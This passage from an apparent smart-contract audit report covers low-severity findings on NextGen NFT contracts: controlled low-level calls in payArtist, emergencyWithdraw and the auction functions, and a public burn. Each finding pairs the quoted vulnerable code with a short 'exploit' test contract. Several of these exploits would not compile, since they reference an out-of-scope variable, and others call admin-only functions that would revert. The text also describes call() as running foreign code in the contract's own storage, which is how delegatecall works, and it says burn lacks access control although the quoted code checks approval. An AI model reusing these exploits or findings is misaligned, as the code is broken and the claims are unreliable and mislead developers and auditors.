        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");
        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");
        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");
        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");
        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd1, success1, artistRoyalties1);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd2, success2, artistRoyalties2);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd3, success3, artistRoyalties3);
        emit PayTeam(tm1, success4, teamRoyalties1);
        emit PayTeam(tm2, success5, teamRoyalties2);
    }
```
**Exploit payArtist function with low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   address me = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);

   }
   
   function testlowCalE() public payable {

      x1.payArtist{value: 2 ether}(uint256(4), address(_x1), address(me), uint256(10), uint256(20));

   }

   receive() external payable {}

   }
```
**Vulnerable emergencyWithdraw function**
```sol
// Ln 461-466
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Exploit emergencyWithdraw function with low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./MinterContract.sol";

contract tMinterContract {

   MinterContract public x1;

   constructor(MinterContract _x1) {

      x1 = MinterContract(_x1);

   }
   
   function testlowCalF() public payable {

      x1.emergencyWithdraw{value: 2 ether}();

   }

   receive() external payable {}

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Do not allow user-controlled data inside the call() function.
```sol
// Ln 438
        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
```
```sol
// Ln 464
        (bool success, ) = payable(admin).call{value: balance}("");
```
## [L-16] Controlled low level call
## Impact
The contract is using call() which is accepting address controlled by a user. 
This can have devastating effects on the contract as a call allows the contract to execute code belonging to other contracts but using it’s own storage. 
This can very easily lead to a loss of funds and compromise of the contract.

## Proof of Concept
**Vulnerable emergencyWithdraw function**
```sol
// Ln 79-84
    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
        uint balance = address(this).balance;
        address admin = adminsContract.owner();
        (bool success, ) = payable(admin).call{value: balance}("");
        emit Withdraw(msg.sender, success, balance);
    }
```
**Exploit claimAuction low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./RandomizerRNG.sol";

contract tRandomizerRNG {

   RandomizerRNG public x1;

   constructor(RandomizerRNG _x1) {

      x1 = RandomizerRNG(_x1);

   }

   function testlowCallC() public payable {

      x1.emergencyWithdraw{value: 2 ether}();

   }

   receive() external payable {}

   }

```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Do not allow user-controlled data inside the call() function.
```sol
// Ln 82
        (bool success, ) = payable(admin).call{value: balance}("");
```
## [L-17] Controlled low level call
## Impact
The contract is using call() which is accepting address controlled by a user. 
This can have devastating effects on the contract as a call allows the contract to execute code belonging to other contracts but using it’s own storage. 
This can very easily lead to a loss of funds and compromise of the contract.

## Proof of Concept
**Vulnerable claimAuction function**
```sol
// Ln 104-120
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
        auctionClaim[_tokenid] = true;
        uint256 highestBid = returnHighestBid(_tokenid);
        address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
        address highestBidder = returnHighestBidder(_tokenid);
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```
**Exploit claimAuction low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./auctionDemo.sol";

contract tauctionDemo {

   auctionDemo public x1;

   constructor(auctionDemo _x1) {

      x1 = auctionDemo(_x1);

   }

   function testLowCal() public payable {

      x1.claimAuction{value: 2 ether}(uint256(12));

   }

   receive() external payable {}

   }
```
**Vulnerable cancelBid function**
```sol
// Ln 124-130
    function cancelBid(uint256 _tokenid, uint256 index) public {
        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
        require(auctionInfoData[_tokenid][index].bidder == msg.sender && auctionInfoData[_tokenid][index].status == true);
        auctionInfoData[_tokenid][index].status = false;
        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
        emit CancelBid(msg.sender, _tokenid, index, success, auctionInfoData[_tokenid][index].bid);
    }
```
**Exploit cancelBid function with low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./auctionDemo.sol";

contract tauctionDemo {

   auctionDemo public x1;

   constructor(auctionDemo _x1) {

      x1 = auctionDemo(_x1);

   }

   function testLowCalB() public payable {

      x1.cancelBid{value: 2 ether}(uint256(24), uint256(12));

   }

   receive() external payable {}

   }
```
**Vulnerable cancelAllBids function**
```sol
// Ln 134-143
    function cancelAllBids(uint256 _tokenid) public {
        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
        for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {
            if (auctionInfoData[_tokenid][i].bidder == msg.sender && auctionInfoData[_tokenid][i].status == true) {
                auctionInfoData[_tokenid][i].status = false;
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit CancelBid(msg.sender, _tokenid, i, success, auctionInfoData[_tokenid][i].bid);
            } else {}
        }
    }
```
**Exploit cancelAllBids function with low level call**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./auctionDemo.sol";

contract tauctionDemo {

   auctionDemo public x1;

   constructor(auctionDemo _x1) {

      x1 = auctionDemo(_x1);

   }

   function testLowCalD() public payable {

      x1.cancelAllBids{value: 2 ether}(uint256(24));
   }

   receive() external payable {}

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Do not allow user-controlled data inside the call() function.
```sol
// Ln 116        
(bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
```
```sol
// Ln 128
        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
```
```sol
// Ln 139
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
```
## [L-18] Public Burn in NextGenCore contract
## Impact
The contract is utilising a public burn function. 
The function is not using an access control to stop other users from burning tokens. 
And, the burn function is using an address other than msg.sender.
## Proof of Concept
**Vulnerable burn function code snippet**
```sol
// Ln 204-209
    function burn(uint256 _collectionID, uint256 _tokenId) public {
        require(_isApprovedOrOwner(_msgSender(), _tokenId), "ERC721: caller is not token owner or approved");
        require ((_tokenId >= collectionAdditionalData[_collectionID].reservedMinTokensIndex) && (_tokenId <= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), "id err");
        _burn(_tokenId);
        burnAmount[_collectionID] = burnAmount[_collectionID] + 1;
    }
```
**Exploit burn function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./NextGenCore.sol";

contract tNextGenCore {

   NextGenCore public x1;

   constructor(NextGenCore _x1) {

      x1 = NextGenCore(_x1);

   }

   function testBurn() public payable {

      x1.burn(uint256(35), uint256(25));

   } 

   }
```
**Vulnerable burnToMint function code snippet**
```sol
// Ln 213-223
    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {
        require(msg.sender == minterContract, "Caller is not the Minter Contract");
        require(_isApprovedOrOwner(burner, _tokenId), "ERC721: caller is not token owner or approved");
        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;
        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {
            _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
            // burn token
            _burn(_tokenId);
            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;
        }
    }
```
**Exploit burnToMint function**
```sol
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.19;

import "./NextGenCore.sol";

contract tNextGenCore {

   NextGenCore public x1;

   constructor(NextGenCore _x1) {

      x1 = NextGenCore(_x1);

   }

   function testBurnB() external payable {

      x1.burnToMint(uint256(4), uint256(8), uint256(24), uint256(32), uint256(24), address(_x1));

   } 

   }
```
## Tools Used
VS Code.
## Recommended Mitigation Steps
Utilise access control modifiers on the burn function to stop other users from burning your tokens. 
Assign msg.sender to the from parameter of the burn function.